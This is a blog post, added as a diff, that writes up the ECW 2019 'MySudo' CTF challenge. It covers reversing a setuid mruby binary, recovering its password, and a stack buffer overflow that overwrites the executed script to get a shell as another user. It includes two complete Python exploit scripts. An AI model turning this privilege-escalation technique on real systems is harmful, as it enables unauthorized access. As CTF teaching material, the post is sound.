@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+        <title> Write Up : ECW 2019 - MySudo &middot; 0xUKN - (in)Security Blog </title>
+
+        <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.69.2" />
+
+
+<script src="https://code.jquery.com/jquery-3.1.1.min.js"   integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="   crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://0xukn.fr/css/nix.css">
+
+
+
+<link rel="shortcut icon" href="/favicon.jpg">
+
+
+
+<link href="https://fonts.googleapis.com/css?family=Inconsolata%7COpen+Sans%7CConcert+One" rel="stylesheet">
+
+
+
+
+    </head>
+
+    <body>
+        <header>
+<nav class="navbar navbar-default navbar-fixed-top navbar-inverse font-header">
+	<div class="container-fluid">
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar-collapse-1" aria-expanded="false">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			<a class="navbar-brand" id="green-terminal" href=https://0xukn.fr>0xUKN@localhost ~ $</a>
+		</div>
+
+		
+		<div class="collapse navbar-collapse" id="navbar-collapse-1">
+			<ul class="nav navbar-nav navbar-right">
+				
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/">about</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/posts">posts</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/projects">projects</a>
+            		
+        		</li>
+        		
+				
+				<li class="dropdown">
+                    
+            		<a id="green-terminal" href="/tags">tags</a>
+            		
+        		</li>
+        		
+
+			</ul>
+		</div>
+	</div>
+</nav>
+</header>
+
+        <div class="container wrapper">
+            <h1><a href="https://0xukn.fr/posts/writeupecw2019mysudo/">Write Up : ECW 2019 - MySudo</a></h1>
+	
+		<br><br>
+		<div id="tags">
+			<h4 style="display:inline">Tags :</h4>
+			
+				
+				<a href="/tags/pwn">pwn</a>
+			
+				 - 
+				<a href="/tags/linux-exploitation">Linux exploitation</a>
+			
+				 - 
+				<a href="/tags/mruby">mruby</a>
+			
+				 - 
+				<a href="/tags/stack-overflow">stack overflow</a>
+			
+		</div>
+	
+            <span class="post-date">2019-11-02 </span>
+            <div class="post-content">
+                <p><em><strong>This post spoils a CTF challenge &hellip; Don&rsquo;t read if you want to try it !</strong></em></p>
+<p>ECW (European Cyber Week) is a Jeopardy student CTF challenge. It is organized by Thales, Airbus and the Bretagne region. I had a great time solving these challenges, especially reverse and pwn ones. Hurry to hand over this !</p>
+<h2 id="-presentation"><em>[+]</em> Presentation</h2>
+<p>Sudo not being very secure, as the leader of the cyber-digital world, we created a replacement</p>
+<p>Admire the result: ssh -p 10022 &lt;username&gt;@challenge-ecw.fr</p>
+<h2 id="-recon"><em>[+]</em> Recon</h2>
+<p>We have a simple CTF setup :</p>
+<ul>
+<li>3 users : ecw (us), adm and root</li>
+<li>2 binaries : <code>~/mysudo</code> (owned by adm, can be executed by ecw, suid) and <code>/tmp/getflag</code> (owned by root, can be executed by adm, suid)</li>
+<li>4 files owned by adm in our home directory : <code>~/main.mrb</code>, <code>~/cat.mrb</code>, <code>~/ls.mrb</code>, <code>~/id.mrb</code>.</li>
+</ul>
+<p>Basically, <code>/tmp/getflag</code> read the flag from <code>/proc/1/environ</code>, so we need to get a shell as adm, and then execute <code>/tmp/getflag</code>.</p>
+<h2 id="-reversing"><em>[+]</em> Reversing</h2>
+<p>File output :
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_mysudo/file.png"  />
+    
+    
+</figure>
+</p>
+<p>I played a bit with the binary to understand how it works, here are examples of output we can get :
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_mysudo/example.png"  />
+    
+    
+</figure>
+</p>
+<p>Let&rsquo;s reverse it to have a better understanding of it !</p>
+<p>We can notice is that the binary uses the mruby lib, which is an embedded Ruby bytecode interpreter in C. The 4 <code>.mrb</code> files are compiled Ruby scripts.</p>
+<p>There are several interestings parts in the binary. The first one is about retrieving the user password and loading <code>main.mrb</code> bytecode.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_mysudo/part1.png"  />
+    
+    
+</figure>
+</p>
+<p>The second one is about checking the password.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_mysudo/part2.png"  />
+    
+    
+</figure>
+</p>
+<p>The last one is about loading the requested <code>mrb</code> script and executing it with the same privileges as it&rsquo;s owner.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_mysudo/part3.png"  />
+    
+    
+</figure>
+</p>
+<p>Let&rsquo;s first find the password : the program takes our input with the <code>get_password</code> function, passes it to <code>main.mrb's encode</code> then xors the output with <code>0xfe</code> and finally compare it with the <code>check_password</code> function.</p>
+<p>I didn&rsquo;t reverse the <code>main.mrb's encode</code> function  (because it was really linear : for a given byte you only had one possible output), I just sent to it all possible bytes from <code>0x00</code> to <code>0xff</code>, in order to create a mapping with the inputs and the associated outputs of the function.</p>
+<p>After applying the xor to the map I made, I just had to read the conditions to finally extract the password : ADMsystem42$$$$.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_mysudo/conditions.png"  />
+    
+    
+</figure>
+</p>
+<p>With the great password, we can now execute the mrb scripts :
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_mysudo/exec1.png"  />
+    
+    
+</figure>
+</p>
+<p>To get the flag, we can&rsquo;t simply create an mrb script which calls <code>/bin/sh</code> because we will have a shell with our own user since we are the owner of our custom script.</p>
+<p>But, there is a buffer overflow vulnerability in the <code>get_password</code> function : the user input can have an arbitrary size so we can overflow the stack and overwrite other variables. The most interesting variable we can overwrite is mrb_payload, which is the content of the mrb script passed as an argument.
+<figure style="text-align: center;" >
+    
+        <img src="/resources/ecw2019_mysudo/vuln.png"  />
+    
+    
+</figure>
+</p>
+<p>So, the idea is to use an adm owned mrb script as an argument and input a very long password to overwrite this script data with our custom mrb payload.<br>
+Our mrb payload will then be executed as the adm user, since the script used as argument is owned by the adm user.</p>
+<p>The only problem is that our mrb payload is mixed with our password so it will be encrypted as the rest of the password.<br>
+We need to decrypt our payload like if it was an encrypted data, and send the result to avoid this side effect :</p>
+<ul>
+<li><code>encrypt(payload) =&gt; garbage</code></li>
+<li><code>encrypt(decrypt(payload)) =&gt; payload</code></li>
+</ul>
+<p>The final problem (an easier one) was that the <code>get_password</code> function checks that it is executed in a real tty, to avoid piping stdin and stdout &hellip;
+Python comes with a handy <code>pty</code> module, which allow us to bypass the <code>isatty</code> function.</p>
+<p>I finally made two scripts : one which generates the payload and one which send the payload to the data through a tty.<br>
+Here is <code>generate.py</code>, which generates a payload with the extracted mapping, based on <code>shell.mrb</code>, which is a simple ruby shell compiled with the mrb compiler <code>mrbc</code>.</p>
+<pre><code>#!/usr/bin/python3
+
+b = [0x6d,0x10,0xb4,0xeb,0x7f,0xcd,0x21,0x7b,0x49,0xc4,0x3d,0x97,0x14,0xab,0x5d,0x0e,0x1f,0x4e,0xb5,0xf9,0x4c,0x92,0xd6,0xc7,0x95,0xa3,0xa6,0xf5,0xb2,0xe4,0xac,0xaa,0xce,0x9c,0xa5,0xbf,0xae,0xcc,0xff,0xf2,0xb1,0xd0,0x99,0x8d,0xde,0x87,0x9b,0xb0,0xf6,0x5e,0xda,0x30,0xd5,0x45,0x89,0x42,0x78,0x12,0xc1,0xf4,0xca,0x0d,0x5f,0x84,0x41,0x71,0x6f,0x28,0x8e,0x33,0xc5,0x77,0xf7,0xe5,0xaf,0x24,0x26,0x03,0xdd,0x39,0x31,0x81,0x8f,0x44,0xf1,0x6b,0x36,0xc2,0x8c,0xbd,0x11,0x40,0x23,0x22,0xb7,0xbb,0xc8,0xfe,0xb3,0xa4,0xc3,0xa7,0xfa,0xee,0xfc,0xc9,0xfd,0x96,0xf8,0x8a,0x93,0xba,0x0c,0x0b,0x2b,0x16,0x0a,0x01,0x4a,0x2d,0xe7,0x3e,0x73,0x9a,0xe3,0xa2,0x9e,0xa8,0xea,0x20,0x46,0xd2,0x3a,0x1e,0x02,0x58,0xec,0x80,0x68,0x47,0x4f,0x86,0x51,0x15,0xe9,0x9d,0x65,0x6a,0x54,0x38,0x7e,0xf0,0x52,0xe2,0x2e,0x88,0xe0,0xdb,0x29,0x64,0x5b,0x05,0x9f,0x69,0x2a,0x35,0x2f,0xb6,0xb8,0xf3,0x3b,0xa0,0x66,0xcf,0x72,0xcb,0xb9,0x25,0x7d,0xa9,0x94,0xe8,0xed,0x8b,0xc6,0x76,0x75,0x50,0x19,0xe6,0x57,0xdf,0x1b,0x79,0x85,0xdc,0x1d,0x70,0x82,0x0f,0x74,0x34,0x13,0xd3,0x09,0x67,0x4d,0x83,0xd1,0x6e,0x3f,0xd8,0x3c,0xe1,0x98,0x62,0x6c,0x43,0xd4,0x7a,0x53,0x17,0x48,0x2c,0xd7,0x32,0xbc,0x55,0x5c,0x08,0xfb,0x07,0x90,0xc0,0x06,0x1c,0xef,0xad,0x04,0x56,0x60,0x63,0xd9,0x61,0x7c,0x37,0x18,0xa1,0x91,0x4b,0x27,0x1a,0xbe]
+a = [chr(i) for i in range(1,204)]+[chr(i) for i in range(205,256)]
+a.remove(&quot;\x0a&quot;) #0x00 and 0x0a are invalid chars
+
+with open(&quot;shell.mrb&quot;,&quot;rb&quot;) as f:
+  data = bytearray(f.read())
+
+out = &quot;&quot;
+temp = &quot;&quot;
+i = 0
+for char in data:
+  if char ^ 0xfe in b:
+    out += a[b.index(char ^ 0xfe)]
+    if a[b.index(char ^ 0xfe)] == &quot;\x0d&quot;: #0x0d is invalid in a fake tty ... dunno why
+       input((char,i))
+    if a[b.index(char ^ 0xfe)] == &quot;\x1c&quot;: #0x1c is invalid in a fake tty ... dunno why
+       input((char,i))
+    temp += chr(char)
+    print((i, char, hex(char), &quot;WIN&quot;))
+  else:
+    out += &quot;*&quot;
+    temp += &quot;\x00&quot;
+    print((i, char, hex(char), &quot;FAILED&quot;))
+  i += 1
+
+with open(&quot;payload.bin&quot;,&quot;wb&quot;) as f:
+  payload = &quot;ADMsystem42$$$$&quot; + &quot;a&quot;*1 + out
+  payload += a[b.index(0x00 ^ 0xfe)] * (256 - len(payload))
+  f.write(payload.encode(&quot;latin1&quot;))
+</code></pre><p>And here is the final <code>flag.py</code>:</p>
+<pre><code>#!/usr/bin/python3
+import pty, os
+
+i = 0
+with open(&quot;payload.bin&quot;, &quot;rb&quot;) as f:
+  payload = f.read()
+  
+def read(fd):
+  global i, payload
+  data = os.read(fd, 10)
+  if i == 0:
+    os.write(fd, payload)
+    i += 1
+  return data
+
+pty.spawn([&quot;/app/mysudo&quot;,&quot;/app/id&quot;], read)
+</code></pre><p>We now have an adm shell, just run <code>/tmp/getflag</code> and get this damn flag !</p>
+<h2 id="-bye"><em>[+]</em> Bye</h2>
+<p><strong>Feel free to tell me what you think about this post :)</strong></p>
+
+            </div>
+            
+            
+            <div class="push"></div>
+        </div>
+        <footer class="footer text-center">
+<p>2020 - 0xUKN -
+<span class="credit">
+	Powered by
+	<a target="_blank" href="https://gohugo.io">Hugo</a>
+	and based on
+	<a target="_blank" href="https://github.com/LordMathis/hugo-theme-nix/">Nix</a> theme.
+</span>
+</p>
+</footer>
+
+    </body>
